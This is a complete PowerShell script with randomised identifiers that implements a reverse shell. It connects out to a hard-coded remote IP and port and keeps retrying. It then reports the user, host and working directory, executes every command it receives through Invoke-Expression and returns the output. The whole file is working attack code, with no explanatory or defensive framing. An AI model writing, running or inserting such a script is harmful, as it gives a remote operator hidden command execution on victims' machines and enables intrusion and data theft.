class lWENuFVGi {
    
    [string]$mkLiUmlbGeQEUAgcYkmzL = "65.0.50.125"
    [int]$erRDxRcpCdaHrppwwHAoLQr = 22612

    $BOzkfedbbBMHjbAJxTOxpp
    $jwiwZveoQlNJwhlmQNrhY
    $GGEoOyfFsNz
    $OgNYLxTxYhY
    $OrRIskmAAgLGSWGcDswKJNPz
    $UwxkteqxzK
    [int]$pvvYfIZvGZrtMqXbtvapXluB = 50*1024

    XHowVTYySRQDABfOgeVrUW() {
        $this.jwiwZveoQlNJwhlmQNrhY = $false
        while ($true) {
            try {
                $this.jwiwZveoQlNJwhlmQNrhY = New-Object Net.Sockets.TcpClient($this.mkLiUmlbGeQEUAgcYkmzL, $this.erRDxRcpCdaHrppwwHAoLQr)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.kRVIWURR()
    }

    kRVIWURR() {
        $this.BOzkfedbbBMHjbAJxTOxpp = $this.jwiwZveoQlNJwhlmQNrhY.GetStream()
        $this.OgNYLxTxYhY = New-Object Byte[] $this.pvvYfIZvGZrtMqXbtvapXluB
        $this.UwxkteqxzK = New-Object Text.UTF8Encoding
        $this.GGEoOyfFsNz = New-Object IO.StreamWriter($this.BOzkfedbbBMHjbAJxTOxpp, [Text.Encoding]::UTF8, $this.pvvYfIZvGZrtMqXbtvapXluB)
        $this.OrRIskmAAgLGSWGcDswKJNPz = New-Object System.IO.StreamReader($this.BOzkfedbbBMHjbAJxTOxpp)
        $this.GGEoOyfFsNz.AutoFlush = $true
    }

    btbsIunVLwdLclwHX() {
        $this.XHowVTYySRQDABfOgeVrUW()
        $this.BTqRgKGoHwxAcME()
    }

    siTUXyOlCHDEikxo($RragU) {
        try {
            [byte[]]$MQtJiwlUAywMwwFUysvCme = [text.Encoding]::Ascii.GetBytes($RragU)
            $this.GGEoOyfFsNz.Write($MQtJiwlUAywMwwFUysvCme, 0, $MQtJiwlUAywMwwFUysvCme.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.btbsIunVLwdLclwHX()
        }
    }

    [string] DysdKNVPd() {
        try {
            $pFLgzuslLaURPAV = $this.BOzkfedbbBMHjbAJxTOxpp.Read($this.OgNYLxTxYhY, 0, $this.pvvYfIZvGZrtMqXbtvapXluB)    
            $pjKioKBACcmWzhnIK = ($this.UwxkteqxzK.GetString($this.OgNYLxTxYhY, 0, $pFLgzuslLaURPAV))
            return $pjKioKBACcmWzhnIK
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.btbsIunVLwdLclwHX()
            return ""
        }
    }

    [string] yrGmp($EeRiNXascFrQZwDZwHU) {
        Write-Host $EeRiNXascFrQZwDZwHU
        try { 
            $zWIvhXPPLNZbqox = Invoke-Expression $EeRiNXascFrQZwDZwHU | Out-String
        }
        catch {
            $EoeqWnSNMrCxhzhWRF = $_.Exception
            $TgJvqGVcJlcVgZjlS = $_.Message
            $zWIvhXPPLNZbqox = "`n$_`n"
        }
        return $zWIvhXPPLNZbqox
    }

    [string] ZRJcYYLWjmbdwVx() {
        $ORiaIDzMHZifJ = [Environment]::UserName
        $kpHasefMMAWv = [System.Net.Dns]::GetHostName()
        $eluCRuuUhGCphHUsGatniST = Get-Location
        return "$ORiaIDzMHZifJ@$kpHasefMMAWv [$eluCRuuUhGCphHUsGatniST]~$ "
    }

    BTqRgKGoHwxAcME() {
        while ($this.jwiwZveoQlNJwhlmQNrhY.Connected) {
            $this.siTUXyOlCHDEikxo($this.ZRJcYYLWjmbdwVx())         
            $pjKioKBACcmWzhnIK = $this.DysdKNVPd()
            $zWIvhXPPLNZbqox = "`n"
            if ([string]::IsNullOrEmpty($pjKioKBACcmWzhnIK)) {
                continue
            }
            $zWIvhXPPLNZbqox = $this.yrGmp($pjKioKBACcmWzhnIK)
            $this.siTUXyOlCHDEikxo($zWIvhXPPLNZbqox + "`n")
            $this.BOzkfedbbBMHjbAJxTOxpp.Flush()
        }
        $this.jwiwZveoQlNJwhlmQNrhY.Close()
        $this.btbsIunVLwdLclwHX()
    } 
}

$BrsJouiMqvsZBAO = [lWENuFVGi]::new()
$BrsJouiMqvsZBAO.btbsIunVLwdLclwHX()
